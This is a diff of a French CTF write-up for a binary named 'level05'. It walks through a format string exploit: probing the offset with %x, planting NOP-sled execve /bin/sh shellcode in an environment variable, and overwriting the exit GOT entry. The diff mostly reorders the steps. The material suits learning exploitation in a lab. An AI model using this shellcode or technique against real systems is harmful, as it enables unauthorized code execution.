@@ -4,25 +4,19 @@ Pour ce niveau, il s'agit d'exploiter une vulnérabilité de type "format string
 
 ## Étapes de résolution
 
-1. **Lancer le binaire dans un environnement minimal**
-   ```sh
-   env -i ./level05
-   ```
-   Cela permet d'avoir un environnement propre et de placer facilement un shellcode dans une variable d'environnement.
-
-2. **Analyse du programme**
+1. **Analyse du programme**
    - Le programme lit un input utilisateur (max 100 caractères).
    - Il convertit les majuscules en minuscules.
    - Il affiche l'input avec `printf(input_buffer);` sans format, ce qui introduit une vulnérabilité de type format string.
 
-3. **Trouver l'offset pour l'attaque format string**
+2. **Trouver l'offset pour l'attaque format string**
    - On envoie :
      ```sh
      python -c 'print("AAAA" + "%x "*25)'
      ```
    - On observe que l'offset pour atteindre notre payload est 10.
 
-4. **Préparer le shellcode**
+3. **Préparer le shellcode**
    - On place un shellcode dans une variable d'environnement :
      ```sh
      export SHELLCODE=$(python -c 'print("\x90"*90 + "\x31\xc9\xf7\xe1\x04\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')
@@ -35,11 +29,11 @@ Pour ce niveau, il s'agit d'exploiter une vulnérabilité de type "format string
      ```
      Exemple d'adresse trouvée : `0xffffde05`
 
-5. **Trouver une fonction à réécrire**
+4. **Trouver une fonction à réécrire**
    - On choisit de réécrire l'adresse de `exit` (appelée après le printf).
    - Adresse à modifier trouver dans gdb avec disas main puis disas le call a la fonction exit: `0x80497e0`
 
-6. **Construire le payload d'exploitation**
+5. **Construire le payload d'exploitation**
    - On split l'adresse du shellcode pour écrire en deux fois (2 bytes à la fois) :
      - `ffff` = 65535
      - `de05` = 56837 (on ajoute 0x10 pour tomber dans le NOP sled : 56853)
@@ -86,4 +80,10 @@ void main(void)
 
 ## Notes
 - Cette attaque exploite la vulnérabilité format string pour écraser l'adresse de sortie du programme et rediriger l'exécution vers notre shellcode placé dans l'environnement.
-- L'utilisation de `env -i` permet de contrôler précisément l'environnement et d'alléger l'espace mémoire pour placer le shellcode à une adresse prévisible.
+- L'utilisation de `env -i` permet de contrôler précisément l'environnement et d'alléger l'espace mémoire pour placer le shellcode à une adresse prévisible.\
+
+Si vous avez des difficulté a tomber sur votre shellcode malgré le MOP sled alors **lancez le binaire dans un environnement minimal**
+   ```sh
+   env -i ./level05
+   ```
+   Cela permet d'avoir un environnement propre et de placer facilement un shellcode dans une variable d'environnement.
